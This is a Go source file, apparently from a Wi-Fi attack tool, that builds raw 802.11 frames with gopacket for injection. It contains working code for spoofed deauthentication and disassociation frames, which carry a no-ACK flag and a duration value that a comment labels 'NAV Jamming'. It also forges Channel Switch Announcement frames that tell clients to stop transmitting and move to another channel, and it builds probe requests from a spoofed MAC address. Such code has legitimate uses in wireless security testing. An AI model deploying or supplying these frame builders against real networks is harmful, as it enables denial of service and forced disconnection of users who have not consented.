package injection

import (
	"fmt"
	"net"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

// PacketBuilder provides helper functions to construct specific 802.11 frames.
type PacketBuilder struct {
	// We might store common config here if needed, but static helpers are fine for now.
}

// SerializeDeauthPacket generates a generic Deauthentication frame.
func SerializeDeauthPacket(targetMAC, senderMAC, bssid net.HardwareAddr, reasonCode uint16, seq uint16) ([]byte, error) {
	return serializeManagementFrame(layers.Dot11TypeMgmtDeauthentication, targetMAC, senderMAC, bssid, reasonCode, seq)
}

// SerializeDisassocPacket generates a generic Disassociation frame.
func SerializeDisassocPacket(targetMAC, senderMAC, bssid net.HardwareAddr, reasonCode uint16, seq uint16) ([]byte, error) {
	return serializeManagementFrame(layers.Dot11TypeMgmtDisassociation, targetMAC, senderMAC, bssid, reasonCode, seq)
}

// SerializeCSAPacket constructs a Channel Switch Announcement Action Frame (or Beacon).
// We use Action Frame (Category Spectrum Management) for efficacy.
func SerializeCSAPacket(targetMAC, bssid net.HardwareAddr, currentChannel, switchCount uint8, seq uint16) ([]byte, error) {
	// 1. RadioTap
	radiotap := &layers.RadioTap{
		Present: layers.RadioTapPresentRate,
		Rate:    5,
	}

	// 2. Dot11 Header (Action Frame)
	dot11Action := &layers.Dot11{
		Type:           layers.Dot11TypeMgmtAction,
		Address1:       targetMAC,
		Address2:       bssid,
		Address3:       bssid,
		SequenceNumber: seq,
	}

	// Payload: Category (0 = Spectrum Mgmt), Action (4 = Channel Switch Announcement)
	// CSA Element: Element ID (37), Length (3), Channel Switch Mode (1), New Channel, Count
	// Mode 1 = Stop transmitting until switch
	newChannel := currentChannel + 5 // Switch to something else (simple heuristic)
	if newChannel > 11 {
		newChannel = 1
	}

	payload := []byte{
		0x00, // Category: Spectrum Management
		0x04, // Action: Channel Switch Announcement
		0x25, // Element ID: 37 (CSA)
		0x03, // Length: 3
		0x01, // Mode: 1 (Stop Tx)
		newChannel,
		switchCount, // Count (down to 0)
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, radiotap, dot11Action, gopacket.Payload(payload)); err != nil {
		return nil, fmt.Errorf("serialize CSA failed: %w", err)
	}

	return buf.Bytes(), nil
}

// SerializeProbeRequest constructs a Probe Request frame.
func SerializeProbeRequest(ssid string, seq uint16) ([]byte, error) {
	// 1. RadioTap Header
	radiotap := &layers.RadioTap{
		Present: layers.RadioTapPresentRate,
		Rate:    5,
	}

	// 2. Dot11 Header (Management Frame, Probe Request)
	srcMAC, _ := net.ParseMAC("02:00:00:00:01:00") // Randomized locally administered
	dstMAC, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff") // Broadcast
	bssid, _ := net.ParseMAC("ff:ff:ff:ff:ff:ff")  // Broadcast BSSID

	dot11 := &layers.Dot11{
		Type:           layers.Dot11TypeMgmtProbeReq,
		Address1:       dstMAC,
		Address2:       srcMAC,
		Address3:       bssid,
		SequenceNumber: seq,
	}

	// 3. Payload (Information Elements)
	payload := []byte{}

	// Tag 0: SSID
	ssidBytes := []byte(ssid)
	payload = append(payload, 0, byte(len(ssidBytes)))
	payload = append(payload, ssidBytes...)

	// Tag 1: Supported Rates (1, 2, 5.5, 11 Mbps basic)
	rates := []byte{0x82, 0x84, 0x8b, 0x96}
	payload = append(payload, 1, byte(len(rates)))
	payload = append(payload, rates...)

	// Tag 50: Extended Supported Rates
	extRates := []byte{0x0c, 0x12, 0x18, 0x24, 0x30, 0x48, 0x60, 0x6c}
	payload = append(payload, 50, byte(len(extRates)))
	payload = append(payload, extRates...)

	// Serialize
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts,
		radiotap,
		dot11,
		gopacket.Payload(payload),
	); err != nil {
		return nil, fmt.Errorf("serialize probe failed: %w", err)
	}

	return buf.Bytes(), nil
}

// serializeManagementFrame helper (internal)
func serializeManagementFrame(subtype layers.Dot11Type, targetMAC, address2, address3 net.HardwareAddr, reasonCode uint16, seq uint16) ([]byte, error) {
	// Construct RadioTap header
	radiotap := &layers.RadioTap{
		Present: layers.RadioTapPresentRate | layers.RadioTapPresentFlags,
		Rate:    5,
		Flags:   0x0008, // No ACK
	}

	// Construct Dot11 header
	dot11 := &layers.Dot11{
		Type:           subtype,
		Address1:       targetMAC, // Destination
		Address2:       address2,  // Source
		Address3:       address3,  // BSSID
		SequenceNumber: seq,
		DurationID:     0x1388, // 5000us (NAV Jamming)
	}

	// Payload based on subtype
	var payload gopacket.SerializableLayer

	switch subtype {
	case layers.Dot11TypeMgmtDeauthentication:
		payload = &layers.Dot11MgmtDeauthentication{Reason: layers.Dot11Reason(reasonCode)}
	case layers.Dot11TypeMgmtDisassociation:
		payload = &layers.Dot11MgmtDisassociation{Reason: layers.Dot11Reason(reasonCode)}
	default:
		return nil, fmt.Errorf("unsupported management subtype: %v", subtype)
	}

	// Serialize
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}

	if err := gopacket.SerializeLayers(buf, opts, radiotap, dot11, payload); err != nil {
		return nil, fmt.Errorf("serialize failed: %w", err)
	}

	return buf.Bytes(), nil
}
